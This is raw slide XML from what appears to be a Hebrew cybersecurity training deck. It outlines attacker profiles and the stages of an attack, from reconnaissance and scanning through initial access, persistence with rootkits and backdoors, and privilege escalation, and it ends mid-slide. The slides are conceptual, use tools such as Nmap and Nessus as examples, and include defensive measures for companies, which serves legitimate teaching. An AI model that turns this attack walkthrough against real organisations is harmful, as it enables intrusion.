              <a:t>המשך – פרופיל תוקף</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{335BBE32-6DC6-41A7-BF53-CB247FCF803B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1864581"/>
            <a:ext cx="10058400" cy="4506402"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. כדי להיערך טוב יותר נגד התקפות על בסיס פרופיל התוקף, חברות יכולות לנקוט במספר צעדים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מודעות ואימון</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חינוך והכשרה של העובדים על שיטות התקיפה הנפוצות ועל מניעים של תוקפים פוטנציאליים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ביצוע סימולציות ותרגילים לזיהוי ותגובה לאיומים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניהול סיכונים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הערכת סיכונים באופן קבוע בהתאם למניעים ולפרופילים של התוקפים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התאמת אמצעי ההגנה לפי רמת הסיכון ומטרות התוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שיפור טכנולוגי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש בכלים וטכנולוגיות מתקדמות לזיהוי ונטרול איומים בזמן אמת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עדכון קבוע של מערכות האבטחה ותוכנות האנטי-וירוס.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שיתוף פעולה עם גופי אכיפת חוק וקהילת האבטחה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שיתוף מידע על תקיפות ופרופילים של תוקפים עם ארגונים אחרים ועם גופים ממשלתיים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="388486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8FE311D-6FD9-4FEB-87FB-EB82D386B8DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6410738" y="642594"/>
            <a:ext cx="4714461" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלבי ביצוע תקיפה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5075D70D-C2AA-4FD7-8A1E-99FBC0F8A4C1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תקיפה בעולם אבטחת המידע מורכבת ממספר שלבים עיקריים: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. איסוף מודיעין </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. סריקה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. גישה ראשונית</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. השגת אחיזה </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. הסלמת הרשאות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>6. תנועה רוחבית </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>7. ויציאה </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="948609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0644C4-91B5-4F81-903E-A4C90A0BB4E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1679713" y="642594"/>
            <a:ext cx="9445486" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 1: איסוף מודיעין </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reconnaissance</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D2306E91-70DC-4E5C-BF6E-D076EDA328DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשלב זה, התוקף מלקט מידע על היעד שלו כדי להבין איך ניתן לתקוף אותו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דמיין שאתה תוקף שמנסה לפרוץ לחברת טכנולוגיה גדולה. בשלב זה, אתה תתחיל בחיפוש מידע ציבורי על החברה: מבנה הארגון, כתובות דוא"ל, כתובות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמות שרתים, ועוד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:OSINT (Open Source Intelligence)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שימוש במקורות מידע ציבוריים כמו מסמכים רשמיים, דוחות פיננסיים, פרסומים באינטרנט, רשתות חברתיות, ואתרים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Shodan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לגלות מכשירים מקוונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Footprinting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תהליך זיהוי תשתיות רשת, כולל מיפוי כתובות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זיהוי סוגי מערכות הפעלה ושירותים פועלים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Google Dorking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שימוש במנועי חיפוש כדי למצוא מידע רגיש על החברה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Whois</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Lookup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בדיקת מידע על שמות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דומיינים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> והבעלות עליהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>רשתות חברתיות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: חיפוש פרופילים של עובדים ופרטי מידע שיכולים להיות מועילים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3198749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C3E48E-62F7-4504-A7E8-CBA92643F038}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4532242" y="642594"/>
            <a:ext cx="6592957" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 2: סריקה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Scanning</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E0AAC632-2158-4C27-9A93-2B5C6452C6C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשלב זה, התוקף סורק את הרשת והמכשירים של היעד כדי למצוא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לאחר שאספת מידע על חברת הטכנולוגיה, אתה מחליט לסרוק את הרשת שלהם כדי למצוא פתחים אפשריים. אתה משתמש בכלי שנקרא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לסרוק את הכתובות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמצאת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Wireshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כלי ניתוח תעבורה שמאפשר לראות את התעבורה ברשת בזמן אמת, כולל פרוטוקולים, חיבורים ונתונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :TCP/IP Fingerprinting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זיהוי סוגי מערכות הפעלה ושירותים פועלים על בסיס התנהגות פרוטוקול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>TCP/IP</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כלי סריקה שיכול למצוא פתחים ופורטות פתוחות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Nessus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כלי לסריקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמזהה תוכנות לא מעודכנות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>ופגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ידועות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3611080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501E066-94F4-4DC2-9D57-4891739BD05A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1709530" y="642594"/>
            <a:ext cx="9415670" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 3: גישה ראשונית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Initial Access</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E84EE4F-B609-47EE-886E-D847008D2A91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשלב זה, התוקף מנסה לקבל גישה למערכת של היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שמצאת פורט פתוח עם שירות ישן ופגיע בשרת של החברה. אתה משתמש בפרצה ידועה כדי לקבל גישה ראשונית למערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Exploit Kits</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> חבילות כלים המכילות קוד שמנצל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ידועות לדפדפנים ותוכנות נפוצות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Social Engineering</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שימוש במניפולציה פסיכולוגית כדי לגרום למשתמשים למסור מידע רגיש או לבצע פעולות מסוכנות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שליחת הודעות דוא"ל מזויפות כדי לגרום למשתמשים לספק מידע רגיש או להתקין תוכנה זדונית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניצול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שימוש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ידועות בשירותים או תוכנות לא מעודכנות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="378633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C15E6B-0B1F-4714-AC2A-9253435FDB7F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="677517" y="602838"/>
            <a:ext cx="10836965" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 4: השגת אחיזה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Establishing a Foothold</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D2D326E-A7F1-483D-A9B1-3CFD60E18955}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשלב זה, התוקף מבסס את הגישה שלו למערכת כדי להבטיח שהוא יוכל להישאר במערכת גם אם מתגלים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אחרי שקיבלת גישה ראשונית לשרת, אתה מתקין תוכנה זדונית כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> rootkit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שתאפשר לך לחזור למערכת גם אם יתגלו וינטרלו את הכניסה הראשונית שלך.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Command and Control (C2)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מערכות שמאפשרות לתוקף לשלוט על מכשירים שנפגעו ולבצע פעולות מרחוק.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Persistence Mechanisms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שיטות להבטחת המשך גישה למערכת, כמו התקנת שירותים אוטומטיים או שינוי קבצי מערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Rootkits</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תוכנות זדוניות המסתתרות במערכת ומאפשרות גישה חבויה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Backdoors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> פתחים סודיים במערכת שמאפשרים גישה גם לאחר סגירת הפגיעות הראשונית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2526068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9549D8C-0014-4237-95D2-BF5A1A719FB7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="747091" y="731520"/>
            <a:ext cx="10697817" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 5: הסלמת הרשאות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6C479AFE-918E-440B-8849-5C8B66C4BB76}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשלב זה, התוקף מנסה להשיג הרשאות גבוהות יותר במערכת כדי לשלוט על יותר משאבים ולהיות בלתי נראה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי להבטיח את השליטה שלך, אתה משתמש בפרצה נוספת שמאפשרת לך להפוך למנהל מערכת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
